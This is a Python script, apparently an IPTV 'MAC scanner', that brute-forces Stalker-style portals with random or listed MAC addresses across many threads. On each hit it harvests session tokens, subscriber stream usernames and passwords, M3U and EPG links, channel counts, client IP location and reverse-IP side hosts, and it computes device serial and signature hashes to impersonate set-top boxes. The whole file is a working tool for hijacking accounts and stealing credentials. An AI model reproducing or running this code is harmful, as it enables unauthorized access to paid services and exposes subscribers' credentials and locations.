├─●📟✦ 𝖢𝖯𝖬 ✦: """+str(cpm)+"""  
├─●⌛✦ 𝖯𝖤𝖱𝖢𝖤𝖭𝖳 𝖣𝖮𝖭𝖤 ✦: """+str(oran)+"""%
├─●⏲️✦ 𝖯𝖱𝖮𝖢𝖤𝖲𝖲𝖤𝖣 ✦: """+str(total)+""" 
╰─●\33[0m \33[33m"""+str(hitr)+"""✦🎯 𝖧𝖨𝖳𝖲 🎯✦ """+str(hitc)+"""✦\33[0m 
 """)
    print(echo)
    cpm=time.time()

            
    
def vpnip(ip):
    url9="https://freeipapi.com/api/json/"+ip
    vpnip=""
    veri=""
    try:
        res = ses.get(url9,  timeout=7, verify=False)
        veri=str(res.text)
        if not '404 page' in veri:
            vpnips=veri.split('"countryName":"')[1]
            vpnc=veri.split('"cityName":"')[1].split('"')[0]
            vpn=vpnips.split('"')[0]+' / ' + vpnc
        else:
            vpn="No Client IP"
    except:
        vpn="No Client IP"
    return vpn
    
def sidehosts(panel_host):
    side=""
    sip=""
    try:
        panel_clean=panel_host.replace("http://","").replace("https://","").split('/')[0].split(':')[0]
        if not panel_clean:
            return ""
        try:
            import socket
            sip=socket.gethostbyname(panel_clean)
        except:
            sip=panel_clean
        api="http://api.hackertarget.com/reverseiplookup/"
        try:
            pwn=ses.get(api, headers={'User-Agent':useragent}, params={"q":sip}, timeout=15, verify=False)
            text=pwn.text
        except:
            text=""
        hosts=[]
        if text and 'No DNS A records found' not in text and 'error' not in text.lower():
            hosts=[h.strip() for h in text.strip().split('\n') if h.strip()]
        side="╭─Side Hosts\n"
        if sip:
            side=side+"╰─➤ IP: "+sip+"\n"
        count=0
        for h in hosts:
            if count>=400:
                break
            count=count+1
            side=side+"╰─➤ "+h+"\n"
        side=side+"╰─✮IP Look Up"
        return side
    except Exception as e:
        return ""
    
    
def goruntu(link):
    try:
        res = ses.get(link,  headers=hea3(), timeout=(2,5), allow_redirects=False,stream=True)
        duru="𝙑𝙋𝙉 ❀ "
        if res.status_code==302:
             duru="𝙑𝙋𝙉「 𝙐𝙉𝙇𝙊𝘾𝙆𝙀𝘿 」🟢 "
    except:
        duru="𝙑𝙋𝙉 ❀ "
    return duru
        
        
tokenr="\33[0m"                             
def hitprint(mac,trh):
    sound = rootDir + "/sounds/gun.mp3"
    file = pathlib.Path(sound)
    if file.exists():
        try:
            if platform.system() == "Windows":
                playsound(sound)
            else:
                if ad:
                    ad.mediaPlay(sound)
        except Exception as e:
            print(f"Error while playing the sound : {e}")
    print('     ❀ ❀ Hits ❀ ❀   \n  '+str(mac)+'\n  ' + str(trh))
    
    
def list(listlink, macs, token, livel):
    kategori = ""
    veri = ""
    bag = 0
    while True:
        try:
            res = ses.get(listlink, headers=hea2(macs, token), timeout=15, verify=False)
            veri = str(res.text)
            break
        except:
            bag = bag + 1
            time.sleep(1)
            if bag == 12:
                break
    
    count = 0
    channels = []
    if veri.count('title":"') > 1:
        for i in veri.split('title":"')[1:]:
            if count >= 400:
                break
            try:
                kanal = ""
                kanal = str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\\/', '/')
            except:
                pass
            if kanal:
                count = count + 1
                channels.append(kanal)

    if channels:
        kategori = livel.join(channels)
    else:
        kategori = ""
    
    return kategori
    
def m3uapi(playerlink,macs,token):
    mt=""
    bag=0
    
    while True:
            try:
                res = ses.get(playerlink, headers=hea2(macs,token), timeout=7, verify=False)
                veri=""
                veri=str(res.text)
                break
            except:
                time.sleep(1)
                bag=bag+1
                if bag==6:
                    break
    try:
            acon=""
            if 'active_cons' in veri:
                acon=veri.split('active_cons":')[1]
                acon=acon.split(',')[0]
                acon=acon.replace('"',"")
                
                
                mcon=veri.split('max_connections":')[1]
                mcon=mcon.split(',')[0]
                mcon=mcon.replace('"',"")
                
                status=veri.split('status":')[1]
                status=status.split(',')[0]
                status=status.replace('"',"")
                
                timezone=veri.split('timezone":"')[1]
                timezone=timezone.split('",')[0]
                timezone=timezone.replace("\\/","/").replace("_"," ").rstrip('"}')
                
                realm=veri.split('url":')[1]
                realm=realm.split(',')[0]
                realm=realm.replace('"',"")
                
                port=veri.split('port":')[1]
                port=port.split(',')[0]
                port=port.replace('"',"")
                
                userm=veri.split('username":')[1]
                userm=userm.split(',')[0]
                userm=userm.replace('"',"")
                
                
                pasm=veri.split('password":')[1]
                pasm=pasm.split(',')[0]
                pasm=pasm.replace('"',"")
                
                try:
                    created_raw = veri.split('created_at":')[1].split(',')[0].replace('"', "")
                    if created_raw:
                        created = datetime.datetime.fromtimestamp(int(created_raw)).strftime('%m-%d-%Y')
                    else:
                        created = "Unknown"
                except:
                    created = "Unknown"

                bitism=""
                bitism=veri.split('exp_date":')[1]
                bitism=bitism.split(',')[0]
                bitism=bitism.replace('"',"")
                
                message=veri.split('message":')[1]
                message=message.split(',')[0]
                message=message.replace('"',"")
                if message=="":
                    message="ɴᴏ ᴍᴇꜱꜱᴀɢᴇ 📨"
                
                if bitism=="null":
                    bitism="Unlimited"
                else:
                    bitism=(datetime.datetime.fromtimestamp(int(bitism)).strftime('%m-%d-%Y'))
                
                mt="""
 ❀❀️🅧🅣🅡🅔🅐🅝 🅘🅝🅕🚫❀❀
❀❀▪Message ➤ """+message+"""
❀❀▪Host ➤ http://"""+realm+""":"""+port+"""
❀❀▪User ➤ """+userm+"""
❀❀▪Pass ➤ """+pasm+"""
❀❀Created: """+created+"""
❀❀Expires: """+bitism+""" 
❀❀Act Con: """+acon+"""
❀❀Max Con: """+mcon+""" 
❀❀Status: """+status+"""
❀❀Timezone: """+timezone+"""
❀❀M3u: http://"""+str(panel)+"""/get.php?username="""+userm+"""&password="""+pasm+"""&type=m3u_plus
❀❀EPG: http://"""+str(panel)+"""/xmltv.php?username="""+userm+"""&password="""+pasm+""" """
    except:pass
    return mt
            
            
# Create locks for thread-safe counters
hit_lock = threading.Lock()

def bot_worker(bot_index):
    """Parameterized worker function for bot operations"""
    global hitc
    global hitr
    global tokenr
    
    bot = f'{bot_index+1:02d}'
    
    # Each thread starts at a different offset (bot_index + 1)
    # and steps by total number of threads (botsay)
    for total in range(bot_index + 1, uz, botsay):
        mac_index = total
        
        if dsyno == "0":
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac_index], re.IGNORECASE)
            if macv:
                mac = macv.group()
            else:
                continue
        
        macs = mac.upper().replace(':', '%3A')
        oran = round(((total) / (uz) * 100), 2)
        
        bag = 0
        veri = ""
        while True:
            try:
                res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
                status_code=res.status_code
                veri = str(res.text)
                echok(mac, bot, total, hitc, oran, tokenr,status_code)
                break
            except:
                bag = bag + 1
                time.sleep(1)
                if bag == 12:
                    break
        
        tokenr = "\33[35m"
        if 'token' in veri:
            tokenr = "\33[1m"
            token = veri.replace('{"js":{"token":"', "")
            token = token.split('"')[0]
            bag = 0
            while True:
                try:
                    res = ses.get(url2, headers=hea2(macs, token), timeout=15, verify=False)
                    veri = ""
                    veri = str(res.text)
                    break
                except:
                    bag = bag + 1
                    time.sleep(1)
                    if bag == 12:
                        break
            
            id = "null"
            ip = ""
            try:
                id = veri.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = veri.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass
            
            if not id == "null":
                bag = 0
                while True:
                    try:
                        res = ses.get(url3, headers=hea2(macs, token), timeout=15, verify=False)
                        veri = ""
                        veri = str(res.text)
                        break
                    except:
                        bag = bag + 1
                        time.sleep(1)
                        if bag == 12:
                            break
                
                if not veri.count('phone') == 0:
                    hitr = "\33[1;36m"
                    # Thread-safe hit counter update
                    with hit_lock:
                        hitc = hitc + 1
                    
                    trh = ""
                    if 'end_date' in veri:
                        trh = veri.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = veri.split('phone":"')[1]
                            trh = trh.split('"')[0]
                            if trh.lower()[:2] == 'un':
                                KalanGun = (" Days")
                            else:
                                KalanGun = (str(tarih_clear(trh)) + " Days")
                                trh = trh + ' ' + KalanGun
                        except:
                            pass
                    
                    hitprint(mac, trh)
                    bag = 0
                    while True:
                        try:
                            res = ses.get(url6, headers=hea2(macs, token), timeout=10, verify=False)
                            veri = ""
                            veri = str(res.text)
                            cid = ""
                            cid = (str(res.text).split('ch_id":"')[5].split('"')[0])
                            break
                        except:
                            bag = bag + 1
                            time.sleep(1)
                            if bag == 10:
                                cid = "94067"
                                break
                    
                    real = panel
                    m3ulink = ""
                    user = ""
                    pas = ""
                    durum = "Invalid Opps"
                    bag = 0
                    while True:
                        try:
                            res = ses.get(url(cid), headers=hea2(macs, token), timeout=15, verify=False)
                            veri = ""
                            veri = str(res.text)
                            link = veri.split('ffmpeg ')[1].split('"')[0].replace('\\/', '/')
                            real = 'http://' + link.split('://')[1].split('/')[0]
                            user = str(link.replace('live/', '').split('/')[3])
                            pas = str(link.replace('live/', '').split('/')[4])
                            m3ulink = "http://" + real.replace('http://', '').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
                            durum = goruntu(link)
                            break
                        except:
                            bag = bag + 1
                            time.sleep(1)
                            if bag == 12:
                                break
                    
                    playerapi = ""
                    if not m3ulink == "":
                        playerlink = str("http://" + real.replace('http://', '').replace('/c/', '') + "/player_api.php?username=" + user + "&password=" + pas)
                        playerapi = m3uapi(playerlink, macs, token)
                        if playerapi == "":
                            playerlink = str("http://" + panel.replace('http://', '').replace('/c/', '') + "/player_api.php?username=" + user + "&password=" + pas)
                            playerapi = m3uapi(playerlink, macs, token)
                    
                    SN = (hashlib.md5(mac.encode('utf-8')).hexdigest())
                    SNENC = SN.upper()
                    SNCUT = SNENC[:13]
                    DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                    DEVENC = DEV.upper()
                    SG = SNCUT + '+' + (mac)
                    SING = (hashlib.sha256(SG.encode('utf-8')).hexdigest())
                    SINGENC = SING.upper()
                    
                    # Get channel counts
                    kanalsayisi = ""
                    filmsayisi = ""
                    dizisayisi = ""
                    
                    # Get live streams count
                    url10 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_live_streams"
                    bag1 = 0
                    while True:
                        try:
                            res = ses.get(url10, headers=hea2(macs, token), timeout=15, verify=False)
                            break
                        except:
                            bag1 = bag1 + 1
                            time.sleep(2)
                            if bag1 == 4:
                                break
                    veri = str(res.text)
                    kanalsayisi = str(veri.count("stream_id"))
                    
                    # Get VOD streams count
                    url10 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_vod_streams"
                    bag1 = 0
                    while True:
                        try:
                            res = ses.get(url10, headers=hea2(macs, token), timeout=15, verify=False)
                            break
                        except:
                            bag1 = bag1 + 1
                            time.sleep(2)
                            if bag1 == 4:
                                break
                    veri = str(res.text)
                    filmsayisi = str(veri.count("stream_id"))
                    
                    # Get series count
                    url10 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_series"
                    bag1 = 0
                    while True:
                        try:
                            res = ses.get(url10, headers=hea2(macs, token), timeout=15, verify=False)
                            break
                        except:
                            bag1 = bag1 + 1
                            time.sleep(2)
                            if bag1 == 4:
                                break
                    veri = str(res.text)
                    dizisayisi = str(veri.count("series_id"))
                    
                    vpn = ""
                    if not ip == "":
                        vpn = vpnip(ip)
                    else:
                        vpn = "ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ ᴀᴅᴅʀᴇꜱꜱ"
                    
                    livelist = ""
                    vodlist = ""
                    serieslist = ""
                    if kanalkata == "1" or kanalkata == "2":
                        listlink = liveurl
                        livel = ' «❀» '
                        livelist = list(listlink, macs, token, livel)
                    if kanalkata == "2":
                        listlink = vodurl
                        livel = ' «❀» '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' «❀» '
                        serieslist = list(listlink, macs, token, livel)
                    
                    hit(mac, trh, real, m3ulink, durum, vpn, livelist, vodlist, serieslist, playerapi, SN, SNENC, SNCUT, DEV, DEVENC, SG, SING, SINGENC, kanalsayisi, filmsayisi, dizisayisi)


# Create and start threads
threads = []
for bot_index in range(botsay):
    thread = threading.Thread(target=bot_worker, args=(bot_index,))
    threads.append(thread)
    thread.start()

# Wait for all threads to complete
for thread in threads:
    thread.join()
    
